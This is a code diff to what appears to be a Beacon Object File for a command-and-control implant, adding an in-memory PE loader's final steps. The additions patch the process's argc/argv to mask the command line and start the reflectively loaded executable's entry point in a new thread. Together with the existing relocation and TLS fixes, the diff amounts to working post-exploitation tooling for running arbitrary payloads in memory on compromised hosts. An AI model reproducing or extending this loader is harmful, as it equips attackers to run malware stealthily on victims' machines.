@@ -1,4 +1,11 @@
 #include <General.hpp>
+#include <PE/IAT.cc>
+
+struct _PE_DATA {
+    HANDLE ThreadHandle;
+    BOOL   Masked;
+};
+typedef _PE_DATA PE_DATA;
 
 auto Fix::Tls( PVOID Base, PVOID DataDir ) -> VOID {
     if ( static_cast<PIMAGE_DATA_DIRECTORY>( DataDir )->Size ) {
@@ -119,6 +126,31 @@ auto Fix::Rel( PVOID Base, UPTR Delta, PVOID DataDir ) -> VOID {
 }
 
 
+auto MaskCommandLine(VOID) -> VOID {
+    IAT::CmdWide = Mem::Alloc<WCHAR*>( MAX_PATH * sizeof(WCHAR) );
+    
+    for ( INT i = 0; IAT::CmdAnsi[i] != '\0' && i < MAX_PATH - 1; i++ ) {
+        IAT::CmdWide[i] = static_cast<WCHAR>( IAT::CmdAnsi[i] );
+    }
+    IAT::CmdWide[MAX_PATH - 1] = L'\0';
+
+    IAT::PoiArgvW = CommandLineToArgvW( IAT::CmdWide, &IAT::CmdArgc );
+    
+    if ( IAT::PoiArgvW && IAT::CmdArgc > 0 ) {
+        if ( auto argcPtr = IAT::__p___argc() ) {
+            *argcPtr = IAT::CmdArgc;
+        }
+        
+        if ( auto argvPtr = IAT::__p___argv() ) {
+            *argvPtr = reinterpret_cast<CHAR**>( IAT::PoiArgvW );
+        }
+        
+        if ( auto wargvPtr = IAT::__p___wargv() ) {
+            *wargvPtr = IAT::PoiArgvW;
+        }
+    }
+}
+
 EXTERN_C
 auto go( CHAR* Args, INT32 Argc ) -> VOID {
     Data Parser = { 0 };
@@ -129,10 +161,14 @@ auto go( CHAR* Args, INT32 Argc ) -> VOID {
     BYTE* Buffer    = (BYTE*)BeaconDataExtract( &Parser, &Length );
     INT32 ArgLen    = 0;
     BYTE* Arguments = (BYTE*)BeaconDataExtract( &Parser, &ArgLen );
+    CHAR* ExportFnc = (CHAR*)BeaconDataExtract( &Parser, 0 ); // dll functions export case
 
+    UPTR   Entry     = 0;
+    ULONG  ThreadID  = 0;
     ULONG* Reads     = { 0 };
     BOOL   IsDLL     = FALSE;
-    HWND   WinHandle = NULL;
+    HWND   WinHandle = nullptr;
+    HANDLE hThread   = INVALID_HANDLE_VALUE;
     HANDLE BackupOut = INVALID_HANDLE_VALUE;
     HANDLE PipeRead  = INVALID_HANDLE_VALUE;
     HANDLE PipeWrite = INVALID_HANDLE_VALUE;
@@ -165,6 +201,7 @@ auto go( CHAR* Args, INT32 Argc ) -> VOID {
         return;
     }
 
+    Entry = ( U_PTR( ImgBase ) + Header->OptionalHeader.AddressOfEntryPoint );
     Delta = ( U_PTR( ImgBase ) - Header->OptionalHeader.ImageBase );
 
     for ( INT i = 0; i < Header->FileHeader.NumberOfSections; i++ ) {
@@ -209,5 +246,5 @@ auto go( CHAR* Args, INT32 Argc ) -> VOID {
         if ( ! ( VirtualProtect( SectionPtr, SectionSize, MemoryProtection, &OldProtection ) ) ) { return; }
     }
 
-    
+    hThread = CreateThread( nullptr, 0, (LPTHREAD_START_ROUTINE )Entry, nullptr, 0, &ThreadID );
 }
